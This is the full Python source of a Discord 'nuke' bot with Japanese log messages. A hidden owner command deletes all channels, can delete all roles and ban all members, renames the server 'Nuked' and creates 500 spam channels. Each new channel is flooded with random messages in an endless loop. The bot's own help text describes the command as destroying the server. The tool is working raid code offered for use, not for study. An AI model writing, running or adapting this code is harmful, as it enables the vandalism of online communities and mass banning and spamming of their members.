import nextcord
import asyncio
import random
import time
import yaml
import sys
from rich import print as rprint
from nextcord.ext import commands

with open("config.yml", "r", encoding="utf-8") as file:
	config = yaml.safe_load(file)

try:
	prefix = str(config["prefix"])
	bot_token = str(config["token"])
	allow_user = int(config["allow_user"])
	all_users_ban = bool(config["users_ban"])
	all_delete_role = bool(config["roles_del"])
	game_play = str(config["gameplay_display"])
	channel_names = list(config["channel_names"])
	messages = list(config["contents"])
except TypeError:
	rprint("[red]config.ymlの設定が無効です[/red]")
	time.sleep(5)
	sys.exit()

bot = commands.Bot(command_prefix=prefix, help_command=None, owner_id=allow_user)

@bot.event
async def on_ready():
	rprint("[green]ログイン成功[/green]")
	await bot.change_presence(activity=nextcord.Game(game_play))
	
@bot.event
async def on_guild_channel_create(channel):
	while True:
		selected_message = str(random.choice(messages))
		try:
			await channel.send(selected_message)
			rprint(f"[green]メッセージの送信成功: {selected_message}[/green]")
		except:
			rprint("[red]メッセージの送信失敗[/red]")
	
@bot.command()
@commands.is_owner()
async def help(help):
	await help.message.delete()
	user = await bot.fetch_user(int(help.author.id))
	help_embed = nextcord.Embed(title="Commands", description="コマンドのリスト")
	help_embed.add_field(name="help", value="コマンドのリストを出します。", inline=False)
	help_embed.add_field(name="stop", value="Botを停止させます。", inline=False)
	help_embed.add_field(name="nuke", value="サーバーを破壊します。", inline=False)
	try:
		await user.send(embed=help_embed)
	except:
		rprint("[red]ユーザーにDMを送信できませんでした。[/red]")
		
@bot.command()
@commands.is_owner()
async def stop(stop):
	await stop.message.delete()
	sys.exit()
	
@bot.command()
@commands.is_owner()
async def nuke(nuke):
	await nuke.message.delete()
	try:
		for channel in nuke.guild.channels:
			try:
				await channel.delete()
				rprint(f"[green]チャンネル削除成功: {channel.name}[/green]")
			except:
				rprint(f"[red]チャンネル削除失敗[/red]")
	except:
		rprint(f"[red]チャンネル削除処理失敗[/red]")
	if all_delete_role == True:
		try:
			for role in nuke.guild.roles:
				try:
					await role.delete()
					rprint(f"[green]ロール削除成功: {role.name}[/green]")
				except:
					rprint(r"[red]ロール削除失敗[/red]")
		except:
			rprint("[red]ロール削除処理失敗[/red]")
	if all_users_ban == True:
		try:
			for member in nuke.guild.members:
				try:
					await member.ban()
					rprint(f"[green]Ban成功: {member.name}[/green]")
				except:
					rprint(f"[red]Ban失敗[/red]")
		except:
			rprint("[red]Ban処理失敗[/red]")
	try:
		await nuke.guild.edit(name="Nuked", community=False)
		rprint("[green]サーバーの名称変更成功[/green]")
	except:
		rprint("[red]サーバーの名称変更失敗[/red]")
	for count in range(500):
		channel_name = str(random.choice(channel_names))
		try:
			created_channel = await nuke.guild.create_text_channel(channel_name)
			rprint(f"[green]チャンネル作成成功: {created_channel.name}[/green]")
		except:
			rprint("[red]チャンネル作成失敗[/red]")

try:
	bot.run(bot_token)
except:
	rprint("[red]ログイン失敗[/red]")
	time.sleep(5)
	sys.exit()